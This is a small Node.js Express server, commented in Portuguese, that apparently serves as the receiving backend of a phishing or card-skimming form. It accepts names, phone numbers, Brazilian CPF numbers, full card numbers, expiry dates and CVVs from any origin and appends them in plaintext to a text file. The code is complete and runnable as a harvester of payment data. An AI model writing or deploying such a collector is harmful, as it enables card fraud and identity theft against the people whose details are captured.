const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');  // Importar o cors

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());  // Usar o cors para permitir requisições cross-origin
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Rota para receber os dados
app.post('/submit', (req, res) => {
  const { nome, telefone, cpf, nomeTitular, numeroCartao, dataValidade, cvv } = req.body;
  const data = `Nome: ${nome}, Telefone: ${telefone}, CPF: ${cpf}, Nome do Titular: ${nomeTitular}, Número do Cartão: ${numeroCartao}, Data de Validade: ${dataValidade}, CVV: ${cvv}\n`;

  // Salvar os dados em um arquivo txt
  fs.appendFile('dados.txt', data, (err) => {
    if (err) {
      console.error('Erro ao salvar os dados:', err);
      res.status(500).send('Erro ao salvar os dados.');
    } else {
      res.status(200).send('Dados recebidos e salvos com sucesso!');
    }
  });
});

// Iniciar o servidor
app.listen(PORT, () => {
  console.log(`Servidor de recebimento de dados rodando na porta ${PORT}`);
});
